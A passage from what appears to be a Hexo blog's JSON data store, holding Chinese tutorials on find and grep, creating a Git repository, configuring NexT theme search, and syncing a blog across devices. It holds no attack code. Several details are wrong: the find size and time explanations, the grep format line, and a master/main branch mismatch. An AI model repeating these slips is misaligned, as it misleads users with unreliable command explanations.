]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。</p>\n<p>　　　　.：所有的单个字符。</p>\n<p>　　　　* ：有字符，长度可以为0。</p>\n<h5 id=\"2-实例\"><a href=\"#2-实例\" class=\"headerlink\" title=\"2.实例\"></a>2.实例</h5><p>　　(1)grep ‘test’ d*　　#显示所有以d开头的文件中包含 test的行</p>\n<p>　　(2)grep ‘test’ aa bb cc 　　 #显示在aa，bb，cc文件中包含test的行</p>\n<p>　　(3)grep ‘[a-z]{5}’ aa 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行</p>\n<p>　　(4)grep magic /usr/src　　#显示/usr/src目录下的文件(不含子目录)包含magic的行</p>\n<p>　　(5)grep -r magic /usr/src　　#显示/usr/src目录下的文件(包含子目录)包含magic的行</p>\n<p>　　(6)grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"find-和-grep命令\"><a href=\"#find-和-grep命令\" class=\"headerlink\" title=\"find 和 grep命令\"></a>find 和 grep命令</h2><p>在使用linux时，经常需要进行文件查找。其中查找的命令主要有find和grep。两个命令是有区的。</p>\n<p>　　区别：</p>\n<ul>\n<li><p>find命令是根据文件的属性进行查找，如文件名，文件大小，所有者，所属组，是否为空，访问时间，修改时间等。 </p>\n</li>\n<li><p>grep是根据文件的内容进行查找，会对文件的每一行按照给定的模式(patter)进行匹配查找。</p>\n</li>\n</ul>\n<h3 id=\"find命令\"><a href=\"#find命令\" class=\"headerlink\" title=\"find命令\"></a>find命令</h3><h4 id=\"基本格式\"><a href=\"#基本格式\" class=\"headerlink\" title=\"基本格式\"></a>基本格式</h4><p>​                       find  path expression</p>\n<h5 id=\"1-按照文件名查找\"><a href=\"#1-按照文件名查找\" class=\"headerlink\" title=\"1.按照文件名查找\"></a>1.按照文件名查找</h5><p>　　　　(1)find / -name httpd.conf　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找</p>\n<p>　　　　(2)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf</p>\n<p>　　　　(3)find /etc -name ‘<em>srm</em>‘　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件</p>\n<p>　　　　(4)find . -name ‘srm*’ 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件</p>\n<h5 id=\"2-按照文件特征查找\"><a href=\"#2-按照文件特征查找\" class=\"headerlink\" title=\"2.按照文件特征查找\"></a>2.按照文件特征查找</h5><p>　　　　(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)</p>\n<p>　　　　(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件</p>\n<p>　　　　(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹</p>\n<p>　　　　(4)find / -group cat 　　# 查找在系统中属于 group为cat的文件</p>\n<p>　　　　(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)</p>\n<p>　　　　(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件</p>\n<p>　　　　(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件</p>\n<p>　　　　(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)</p>\n<p>　　　　(9)find / -size -1000k 　　#查找出小于1000KB的文件</p>\n<h5 id=\"3-使用混合查找方式查找文件\"><a href=\"#3-使用混合查找方式查找文件\" class=\"headerlink\" title=\"3.使用混合查找方式查找文件\"></a>3.使用混合查找方式查找文件</h5><p>　　　　参数有： ！，-and(-a)，-or(-o)。</p>\n<p>　　 (1)find /tmp -size +10000c -and -mtime +2    #在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件</p>\n<p>  　   (2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件</p>\n<p>  　   (3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件</p>\n<h3 id=\"grep命令\"><a href=\"#grep命令\" class=\"headerlink\" title=\"grep命令\"></a>grep命令</h3><p>　　　  基本格式：find  expression</p>\n<h5 id=\"1-主要参数\"><a href=\"#1-主要参数\" class=\"headerlink\" title=\"1.主要参数\"></a>1.主要参数</h5><p>　　　　[options]主要参数：</p>\n<p>　　　　－c：只输出匹配行的计数。</p>\n<p>　　　　－i：不区分大小写</p>\n<p>　　　　－h：查询多文件时不显示文件名。</p>\n<p>　　　　－l：查询多文件时只输出包含匹配字符的文件名。</p>\n<p>　　　　－n：显示匹配行及行号。</p>\n<p>　　　　－s：不显示不存在或无匹配文本的错误信息。</p>\n<p>　　　　－v：显示不包含匹配文本的所有行。</p>\n<p>　　　　pattern正则表达式主要参数：</p>\n<p>　　　　\\： 忽略正则表达式中特殊字符的原有含义。</p>\n<p>　　　　^：匹配正则表达式的开始行。</p>\n<p>　　　　$: 匹配正则表达式的结束行。</p>\n<p>　　　　&lt;：从匹配正则表达 式的行开始。</p>\n<p>　　　　&gt;：到匹配正则表达式的行结束。</p>\n<p>　　　　[ ]：单个字符，如[A]即A符合要求 。</p>\n<p>　　　　[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。</p>\n<p>　　　　.：所有的单个字符。</p>\n<p>　　　　* ：有字符，长度可以为0。</p>\n<h5 id=\"2-实例\"><a href=\"#2-实例\" class=\"headerlink\" title=\"2.实例\"></a>2.实例</h5><p>　　(1)grep ‘test’ d*　　#显示所有以d开头的文件中包含 test的行</p>\n<p>　　(2)grep ‘test’ aa bb cc 　　 #显示在aa，bb，cc文件中包含test的行</p>\n<p>　　(3)grep ‘[a-z]{5}’ aa 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行</p>\n<p>　　(4)grep magic /usr/src　　#显示/usr/src目录下的文件(不含子目录)包含magic的行</p>\n<p>　　(5)grep -r magic /usr/src　　#显示/usr/src目录下的文件(包含子目录)包含magic的行</p>\n<p>　　(6)grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，</p>\n"},{"title":"git新建仓库","date":"2021-12-04T08:49:31.000Z","typora-root-url":"..","_content":"\ngit新建仓库上传代码\n\n<!--more-->\n\n<img src=\"/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png\" alt=\"image-20211204165449892\" style=\"zoom: 67%;\" />\n\n首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹\n\n在该文件夹下打开git bash\n\n输入下列命令\n\n```\ngit config --global user.name \"用户名\"\ngit config --global user.email \"邮箱\"\ngit init  会生成.git文件夹\ngit add .\ngit commit -m \"first commit\"\ngit branch -M master\n//使用ssh之前要先配置公钥\ngit remote add origin git@github.com:用户名/仓库名.git\ngit push -u origin main\n```\n","source":"_posts/git新建仓库.md","raw":"---\ntitle: git新建仓库\ndate: 2021-12-04 16:49:31\ntags: \n     - git\n     - github\ncategories: git\ntypora-root-url: ..\n---\n\ngit新建仓库上传代码\n\n<!--more-->\n\n<img src=\"/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png\" alt=\"image-20211204165449892\" style=\"zoom: 67%;\" />\n\n首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹\n\n在该文件夹下打开git bash\n\n输入下列命令\n\n```\ngit config --global user.name \"用户名\"\ngit config --global user.email \"邮箱\"\ngit init  会生成.git文件夹\ngit add .\ngit commit -m \"first commit\"\ngit branch -M master\n//使用ssh之前要先配置公钥\ngit remote add origin git@github.com:用户名/仓库名.git\ngit push -u origin main\n```\n","slug":"git新建仓库","published":1,"updated":"2022-01-07T13:31:06.115Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9m3000egsw9ahvt55nz","content":"<p>git新建仓库上传代码</p>\n<span id=\"more\"></span>\n\n<img src=\"/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png\" alt=\"image-20211204165449892\" style=\"zoom: 67%;\" />\n\n<p>首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹</p>\n<p>在该文件夹下打开git bash</p>\n<p>输入下列命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name &quot;用户名&quot;</span><br><span class=\"line\">git config --global user.email &quot;邮箱&quot;</span><br><span class=\"line\">git init  会生成.git文件夹</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;first commit&quot;</span><br><span class=\"line\">git branch -M master</span><br><span class=\"line\">//使用ssh之前要先配置公钥</span><br><span class=\"line\">git remote add origin git@github.com:用户名/仓库名.git</span><br><span class=\"line\">git push -u origin main</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>git新建仓库上传代码</p>","more":"<img src=\"/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png\" alt=\"image-20211204165449892\" style=\"zoom: 67%;\" />\n\n<p>首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹</p>\n<p>在该文件夹下打开git bash</p>\n<p>输入下列命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name &quot;用户名&quot;</span><br><span class=\"line\">git config --global user.email &quot;邮箱&quot;</span><br><span class=\"line\">git init  会生成.git文件夹</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;first commit&quot;</span><br><span class=\"line\">git branch -M master</span><br><span class=\"line\">//使用ssh之前要先配置公钥</span><br><span class=\"line\">git remote add origin git@github.com:用户名/仓库名.git</span><br><span class=\"line\">git push -u origin main</span><br></pre></td></tr></table></figure>"},{"title":"hexo的next主题配置搜索功能","date":"2021-12-04T15:39:33.000Z","_content":"\n1.安装插件\n\n`npm install hexo-generator-searchdb --save`\n\n2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true\n\n3.将下列参数添加到hexo的配置文件中(_config.yml)\n\n```\nsearch:\n  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.\n  field: post\n  format: html\n  limit: 10000\n```\n\n然后\n\n```\nhexo clean\nhexo g\nhexo d\n```\n\n即可在线使用搜索功能\n\n#### 注意事项:\n\n安装searchdb插件后\n\n如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框\n\n","source":"_posts/hexo的next主题配置搜索功能.md","raw":"---\ntitle: hexo的next主题配置搜索功能\ndate: 2021-12-04 23:39:33\ntags:\n    -hexo\n    -Next主题搜索功能\ncategories: hexo\n---\n\n1.安装插件\n\n`npm install hexo-generator-searchdb --save`\n\n2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true\n\n3.将下列参数添加到hexo的配置文件中(_config.yml)\n\n```\nsearch:\n  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.\n  field: post\n  format: html\n  limit: 10000\n```\n\n然后\n\n```\nhexo clean\nhexo g\nhexo d\n```\n\n即可在线使用搜索功能\n\n#### 注意事项:\n\n安装searchdb插件后\n\n如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框\n\n","slug":"hexo的next主题配置搜索功能","published":1,"updated":"2022-01-07T13:31:06.116Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9m4000fgsw96eqc6pjo","content":"<p>1.安装插件</p>\n<p><code>npm install hexo-generator-searchdb --save</code></p>\n<p>2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true</p>\n<p>3.将下列参数添加到hexo的配置文件中(_config.yml)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\">  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  limit: 10000</span><br></pre></td></tr></table></figure>\n\n<p>然后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>\n\n<p>即可在线使用搜索功能</p>\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项:\"></a>注意事项:</h4><p>安装searchdb插件后</p>\n<p>如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1.安装插件</p>\n<p><code>npm install hexo-generator-searchdb --save</code></p>\n<p>2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true</p>\n<p>3.将下列参数添加到hexo的配置文件中(_config.yml)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\">  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  limit: 10000</span><br></pre></td></tr></table></figure>\n\n<p>然后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>\n\n<p>即可在线使用搜索功能</p>\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项:\"></a>注意事项:</h4><p>安装searchdb插件后</p>\n<p>如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框</p>\n"},{"title":"hexo多设备操作","date":"2021-12-03T18:03:57.000Z","typora-root-url":"..","_content":"\n在解决掉hexo图片路径的问题后,着手解决hexo多设备更新文章的问题<!--more-->\n\n首先在新设备上面安装Node.js和Git\n\n接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支\n\n![image-20211204031522619](/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png)\n\n确保该分支中文件为空\n\n在要安装hexo的地方打开git bash,生成SSH公钥添加到Github\n\n`git config --global user.name \"yourname\"`\n\n`git config --global user.email \"youremail\"`\n\n可以用这两条命令检查有没有输对\n\n`git config user.name`\n\n`git config user.email`\n\n确保正确后\n\n输入`ssh-keygen -t rsa -C \"youremail\"`\n\n会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在`头像->setting->SSH and GPG keys`下点击`New SSH key`,将复制的公钥粘贴进去,即完成了SSH公钥的添加\n\n在父目录打开git bash\n\n`git clone git@github.com:yourname/yourname.github.io.git hexo` \n\n就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件\n\n接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录\n\n接着安装hexo \n\n`npm install -g hexo cli`\n\n这个时候记得将当前目录切换为hexo目录\n\n安装一些依赖,不知道哪些有用,反正都装上吧\n\n```bash\nnpm install hexo-generator-index --save\nnpm install hexo-generator-archive --save\nnpm install hexo-generator-category --save\nnpm install hexo-generator-tag --save\nnpm install hexo-server --save\nnpm install hexo-deployer-git --save\nnpm install hexo-deployer-heroku --save\nnpm install hexo-deployer-rsync --save\nnpm install hexo-deployer-openshift --save\nnpm install hexo-renderer-marked@0.2 --save\nnpm install hexo-renderer-stylus@0.2 --save\nnpm install hexo-generator-feed@1 --save\nnpm install hexo-generator-sitemap@1 --save\nnpm install hexo-generator-search --save\nnpm install hexo-generator-searchdb --save\n```\n\n接下来在有.git文件夹的目录下打开git bash\n\n开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去\n\n`git init`\n\n将当前目录下的文件放到暂存区(上膛)\n\n`git add .`\n\n可以用`git status`查看当前文件状态\n\n接着用`git commit -m \"本次提交的描述信息\"`提交描述信息\n\n因为之前已经拉取过,所以这句可以省略`git remote add origin \"远程仓库地址\"`\n\n`git push origin source`这样就成功将文件push到了source目录上面\n\n提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败\n\n提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问\n\n,新电脑只需要拉取source分支并安装需要的软件就能写博客了\n\n需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支\n\n如果不嫌麻烦的话,每次写完文章\n\ngit bash 五连击\n\n```bash\nhexo g\nhexo d\ngit add .\ngit commit -m \"new page\"\ngit push origin source\n```\n\n换设备之后只需要在hexo目录下git pull即可写文章了\n\n有时因为一些文件并不是直接创建或者删除,而是做了修改,git可能提示会需要merge\n\n这个时候采用强制覆盖本地文件的方式\n\n`git fetch --all`\n\n`git reset --hard origin/分支名称`\n\n","source":"_posts/hexo多设备操作.md","raw":"---\ntitle: hexo多设备操作\ndate: 2021-12-04 02:03:57\ntags: \n    - hexo \n    - github\n    - github公钥设置\ncategories: hexo\ntypora-root-url: ..\n---\n\n在解决掉hexo图片路径的问题后,着手解决hexo多设备更新文章的问题<!--more-->\n\n首先在新设备上面安装Node.js和Git\n\n接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支\n\n![image-20211204031522619](/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png)\n\n确保该分支中文件为空\n\n在要安装hexo的地方打开git bash,生成SSH公钥添加到Github\n\n`git config --global user.name \"yourname\"`\n\n`git config --global user.email \"youremail\"`\n\n可以用这两条命令检查有没有输对\n\n`git config user.name`\n\n`git config user.email`\n\n确保正确后\n\n输入`ssh-keygen -t rsa -C \"youremail\"`\n\n会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在`头像->setting->SSH and GPG keys`下点击`New SSH key`,将复制的公钥粘贴进去,即完成了SSH公钥的添加\n\n在父目录打开git bash\n\n`git clone git@github.com:yourname/yourname.github.io.git hexo` \n\n就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件\n\n接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录\n\n接着安装hexo \n\n`npm install -g hexo cli`\n\n这个时候记得将当前目录切换为hexo目录\n\n安装一些依赖,不知道哪些有用,反正都装上吧\n\n```bash\nnpm install hexo-generator-index --save\nnpm install hexo-generator-archive --save\nnpm install hexo-generator-category --save\nnpm install hexo-generator-tag --save\nnpm install hexo-server --save\nnpm install hexo-deployer-git --save\nnpm install hexo-deployer-heroku --save\nnpm install hexo-deployer-rsync --save\nnpm install hexo-deployer-openshift --save\nnpm install hexo-renderer-marked@0.2 --save\nnpm install hexo-renderer-stylus@0.2 --save\nnpm install hexo-generator-feed@1 --save\nnpm install hexo-generator-sitemap@1 --save\nnpm install hexo-generator-search --save\nnpm install hexo-generator-searchdb --save\n```\n\n接下来在有.git文件夹的目录下打开git bash\n\n开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去\n\n`git init`\n\n将当前目录下的文件放到暂存区(上膛)\n\n`git add .`\n\n可以用`git status`查看当前文件状态\n\n接着用`git commit -m \"本次提交的描述信息\"`提交描述信息\n\n因为之前已经拉取过,所以这句可以省略`git remote add origin \"远程仓库地址\"`\n\n`git push origin source`这样就成功将文件push到了source目录上面\n\n提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败\n\n提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问\n\n,新电脑只需要拉取source分支并安装需要的软件就能写博客了\n\n需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支\n\n如果不嫌麻烦的话,每次写完文章\n\ngit bash 五连击\n\n```bash\nhexo g\nhexo d\ngit add .\ngit commit -m \"new page\"\ngit push origin source\n```\n\n换设备之后只需要在hexo目录下git pull即可写文章了\n\n有时因为一些文件并不是直接创建或者删除,而是做了修改,git可能提示会需要merge\n\n这个时候采用强制覆盖本地文件的方式\n\n`git fetch --all`\n\n`git reset --hard origin/分支名称`\n\n","slug":"hexo多设备操作","published":1,"updated":"2022-01-07T13:56:33.703Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9m6000jgsw9azac7kxf","content":"<p>在解决掉hexo图片路径的问题后,着手解决hexo多设备更新文章的问题<span id=\"more\"></span></p>\n<p>首先在新设备上面安装Node.js和Git</p>\n<p>接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支</p>\n<p><img src=\"/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png\" alt=\"image-20211204031522619\"></p>\n<p>确保该分支中文件为空</p>\n<p>在要安装hexo的地方打开git bash,生成SSH公钥添加到Github</p>\n<p><code>git config --global user.name &quot;yourname&quot;</code></p>\n<p><code>git config --global user.email &quot;youremail&quot;</code></p>\n<p>可以用这两条命令检查有没有输对</p>\n<p><code>git config user.name</code></p>\n<p><code>git config user.email</code></p>\n<p>确保正确后</p>\n<p>输入<code>ssh-keygen -t rsa -C &quot;youremail&quot;</code></p>\n<p>会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在<code>头像-&gt;setting-&gt;SSH and GPG keys</code>下点击<code>New SSH key</code>,将复制的公钥粘贴进去,即完成了SSH公钥的添加</p>\n<p>在父目录打开git bash</p>\n<p><code>git clone git@github.com:yourname/yourname.github.io.git hexo</code> </p>\n<p>就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件</p>\n<p>接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录</p>\n<p>接着安装hexo </p>\n<p><code>npm install -g hexo cli</code></p>\n<p>这个时候记得将当前目录切换为hexo目录</p>\n<p>安装一些依赖,不知道哪些有用,反正都装上吧</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-index --save</span><br><span class=\"line\">npm install hexo-generator-archive --save</span><br><span class=\"line\">npm install hexo-generator-category --save</span><br><span class=\"line\">npm install hexo-generator-tag --save</span><br><span class=\"line\">npm install hexo-server --save</span><br><span class=\"line\">npm install hexo-deployer-git --save</span><br><span class=\"line\">npm install hexo-deployer-heroku --save</span><br><span class=\"line\">npm install hexo-deployer-rsync --save</span><br><span class=\"line\">npm install hexo-deployer-openshift --save</span><br><span class=\"line\">npm install hexo-renderer-marked@0.2 --save</span><br><span class=\"line\">npm install hexo-renderer-stylus@0.2 --save</span><br><span class=\"line\">npm install hexo-generator-feed@1 --save</span><br><span class=\"line\">npm install hexo-generator-sitemap@1 --save</span><br><span class=\"line\">npm install hexo-generator-search --save</span><br><span class=\"line\">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>\n\n<p>接下来在有.git文件夹的目录下打开git bash</p>\n<p>开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去</p>\n<p><code>git init</code></p>\n<p>将当前目录下的文件放到暂存区(上膛)</p>\n<p><code>git add .</code></p>\n<p>可以用<code>git status</code>查看当前文件状态</p>\n<p>接着用<code>git commit -m &quot;本次提交的描述信息&quot;</code>提交描述信息</p>\n<p>因为之前已经拉取过,所以这句可以省略<code>git remote add origin &quot;远程仓库地址&quot;</code></p>\n<p><code>git push origin source</code>这样就成功将文件push到了source目录上面</p>\n<p>提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败</p>\n<p>提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问</p>\n<p>,新电脑只需要拉取source分支并安装需要的软件就能写博客了</p>\n<p>需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支</p>\n<p>如果不嫌麻烦的话,每次写完文章</p>\n<p>git bash 五连击</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo g</span><br><span class=\"line\">hexo d</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">&quot;new page&quot;</span></span><br><span class=\"line\">git push origin <span class=\"built_in\">source</span></span><br></pre></td></tr></table></figure>\n\n<p>换设备之后只需要在hexo目录下git pull即可写文章了</p>\n<p>有时因为一些文件并不是直接创建或者删除,而是做了修改,git可能提示会需要merge</p>\n<p>这个时候采用强制覆盖本地文件的方式</p>\n<p><code>git fetch --all</code></p>\n<p><code>git reset --hard origin/分支名称</code></p>\n","site":{"data":{}},"excerpt":"<p>在解决掉hexo图片路径的问题后,着手解决hexo多设备更新文章的问题","more":"</p>\n<p>首先在新设备上面安装Node.js和Git</p>\n<p>接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支</p>\n<p><img src=\"/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png\" alt=\"image-20211204031522619\"></p>\n<p>确保该分支中文件为空</p>\n<p>在要安装hexo的地方打开git bash,生成SSH公钥添加到Github</p>\n<p><code>git config --global user.name &quot;yourname&quot;</code></p>\n<p><code>git config --global user.email &quot;youremail&quot;</code></p>\n<p>可以用这两条命令检查有没有输对</p>\n<p><code>git config user.name</code></p>\n<p><code>git config user.email</code></p>\n<p>确保正确后</p>\n<p>输入<code>ssh-keygen -t rsa -C &quot;youremail&quot;</code></p>\n<p>会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在<code>头像-&gt;setting-&gt;SSH and GPG keys</code>下点击<code>New SSH key</code>,将复制的公钥粘贴进去,即完成了SSH公钥的添加</p>\n<p>在父目录打开git bash</p>\n<p><code>git clone git@github.com:yourname/yourname.github.io.git hexo</code> </p>\n<p>就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件</p>\n<p>接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录</p>\n<p>接着安装hexo </p>\n<p><code>npm install -g hexo cli</code></p>\n<p>这个时候记得将当前目录切换为hexo目录</p>\n<p>安装一些依赖,不知道哪些有用,反正都装上吧</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-index --save</span><br><span class=\"line\">npm install hexo-generator-archive --save</span><br><span class=\"line\">npm install hexo-generator-category --save</span><br><span class=\"line\">npm install hexo-generator-tag --save</span><br><span class=\"line\">npm install hexo-server --save</span><br><span class=\"line\">npm install hexo-deployer-git --save</span><br><span class=\"line\">npm install hexo-deployer-heroku --save</span><br><span class=\"line\">npm install hexo-deployer-rsync --save</span><br><span class=\"line\">npm install hexo-deployer-openshift --save</span><br><span class=\"line\">npm install hexo-renderer-marked@0.2 --save</span><br><span class=\"line\">npm install hexo-renderer-stylus@0.2 --save</span><br><span class=\"line\">npm install hexo-generator-feed@1 --save</span><br><span class=\"line\">npm install hexo-generator-sitemap@1 --save</span><br><span class=\"line\">npm install hexo-generator-search --save</span><br><span class=\"line\">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>\n\n<p>接下来在有.git文件夹的目录下打开git bash</p>\n<p>开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去</p>\n<p><code>git init</code></p>\n<p>将当前目录下的文件放到暂存区(上膛)</p>\n<p><code>git add .</code></p>\n<p>可以用<code>git status</code>查看当前文件状态</p>\n<p>接着用<code>git commit -m 